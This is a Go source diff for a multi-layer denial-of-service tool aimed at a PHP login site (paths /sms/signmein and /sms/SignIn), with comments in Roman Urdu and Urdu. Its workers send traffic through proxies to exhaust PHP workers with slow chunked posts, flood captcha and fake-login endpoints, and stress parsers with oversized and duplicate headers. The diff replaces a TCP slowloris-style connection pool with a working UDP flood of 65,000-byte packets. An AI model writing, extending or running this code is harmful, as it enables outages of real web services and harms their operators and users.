@@ -13,7 +13,6 @@ import (
 
 // ============================================================
 // LAYER 1: SLOW CHUNKED POST (PHP-FPM WORKER EXHAUSTION)
-// POST /sms/signmein — har PHP worker ko 15-30s tak busy rakhta hai
 // ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
@@ -84,7 +83,6 @@ func slowLoginBody() io.Reader {
 
 // ============================================================
 // LAYER 2: CAPTCHA PAGE FLOOD (CPU + DB EXHAUSTION)
-// GET /sms/SignIn — har request pe captcha generate + session create + DB hit
 // ============================================================
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
@@ -134,7 +132,6 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 
 // ============================================================
 // LAYER 3: CACHE BYPASS + FAKE LOGIN POST
-// POST /sms/signmein — fake credentials, PHP verify + DB check
 // ============================================================
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
@@ -150,7 +147,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		// Fake login POST
 		body := fmt.Sprintf("username=%s&password=%s&capt=%d",
 			randomString(8+rand.Intn(16)),
 			randomString(8+rand.Intn(16)),
@@ -190,88 +186,58 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 }
 
 // ============================================================
-// LAYER 4: TCP CONNECTION TSUNAMI (KERNEL EXHAUSTION)
-// Raw TCP connections — kernel ke file descriptors aur nf_conntrack table khatam
-// HTTP nahi, seedha kernel level attack
+// LAYER 4: UDP NETWORK FLOOD (NETWORK PIPE SATURATION)
+// یہ حملہ HTTP کو مکمل نظرانداز کرتا ہے اور براہ راست سرور کے
+// نیٹ ورک اسٹیک کو نشانہ بناتا ہے، UDP پیکٹس کا سیلاب بھیج کر۔
 // ============================================================
-func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
+func udpNetworkFlood(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
 
-	// Har worker multiple TCP connections kholta hai
-	connectionsPerWorker := 50
+	// ہوسٹ سے پورٹ الگ کریں، اگر پورٹ نہیں ہے تو ڈیفالٹ 80 استعمال کریں
+	host := o.target.Host
+	port := "80"
+	if h, p, err := net.SplitHostPort(host); err == nil {
+		host = h
+		port = p
+	}
+	targetAddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(host, port))
+	if err != nil {
+		return fmt.Errorf("UDP پتہ حل کرنے میں ناکامی: %w", err)
+	}
+
+	conn, err := net.DialUDP("udp", nil, targetAddr)
+	if err != nil {
+		return fmt.Errorf("UDP کنکشن بنانے میں ناکامی: %w", err)
+	}
+	defer conn.Close()
+
+	// 65,507 بائٹس کا ایک بہت بڑا UDP پیکٹ (میکسیمم UDP سائز)
+	payload := make([]byte, 65000)
+	rand.Read(payload)
 
 	for {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
 		default:
-		}
-
-		// Connections ka pool kholo
-		var conns []net.Conn
-		for i := 0; i < connectionsPerWorker; i++ {
-			select {
-			case <-ctx.Done():
-				for _, c := range conns {
-					c.Close()
-				}
-				return ctx.Err()
-			default:
-			}
-
-			conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
+			conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
+			_, err := conn.Write(payload)
 			if err != nil {
+				o.stats.FailedRequests.Add(1)
+				o.stats.Layers[layerIdx].Fail.Add(1)
 				continue
 			}
-
-			// Incomplete HTTP request bhejo — Apache worker block
-			partialReq := fmt.Sprintf(
-				"POST /sms/signmein HTTP/1.1\r\nHost: %s\r\nContent-Length: 99999999\r\nConnection: keep-alive\r\n",
-				o.target.Host,
-			)
-			// Note: deliberately NO final \r\n — request incomplete
-			// Apache worker iska wait karega jab tak timeout na ho
-
-			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-			conn.Write([]byte(partialReq))
-
-			conns = append(conns, conn)
 			o.stats.TotalRequests.Add(1)
 			o.stats.Layers[layerIdx].Requests.Add(1)
+			o.stats.SuccessRequests.Add(1)
+			o.stats.Layers[layerIdx].Success.Add(1)
+			o.stats.BytesSent.Add(int64(len(payload)))
 		}
-
-		// Connections ko 20-40 seconds tak khula rakho
-		deadline := time.Now().Add(time.Duration(rand.Intn(20)+20) * time.Second)
-		for time.Now().Before(deadline) {
-			select {
-			case <-ctx.Done():
-				for _, c := range conns {
-					c.Close()
-				}
-				return ctx.Err()
-			case <-time.After(time.Duration(rand.Intn(3000)+1000) * time.Millisecond):
-			}
-
-			// Keep-alive — chhota sa data bhej kar connection zinda rakho
-			for _, conn := range conns {
-				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
-				conn.Write([]byte("X-Keep-Alive: " + randomString(64) + "\r\n"))
-			}
-		}
-
-		// Sab connections band karo
-		for _, conn := range conns {
-			conn.Close()
-		}
-
-		o.stats.SuccessRequests.Add(int64(connectionsPerWorker))
-		o.stats.Layers[layerIdx].Success.Add(int64(connectionsPerWorker))
 	}
 }
 
 // ============================================================
 // LAYER 5: PARSER STRESS + OVERSIZED HEADERS
-// Apache + PHP memory pressure via 16KB+ headers
 // ============================================================
 var oversizedHeaderNames = []string{
 	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
@@ -303,7 +269,6 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		req.Header.Set("User-Agent", randomUA())
 		req.Header.Set("Connection", "keep-alive")
 
-		// Multiple oversized headers (8KB-16KB each)
 		req.Header.Set("X-Oversized-1", randomString(8192+rand.Intn(8192)))
 		req.Header.Set("X-Oversized-2", randomString(8192+rand.Intn(8192)))
 
@@ -313,12 +278,10 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 			}
 		}
 
-		// Duplicate headers — Apache merge karta hai → CPU waste
 		for i := 0; i < 100; i++ {
 			req.Header.Add("X-Duplicate-Header", "value-"+intToStr(i))
 		}
 
-		// Invalid encoding to confuse compression
 		req.Header.Set("Accept-Encoding", "gzip;q=0, identity;q=0, *;q=0, br;q=0")
 		req.Header.Set("Transfer-Encoding", "gzip, chunked, identity")
 
@@ -378,5 +341,4 @@ func randomString(n int) string {
 	return string(b)
 }
 
-// Ensure net package is used
 var _ = net.Dial
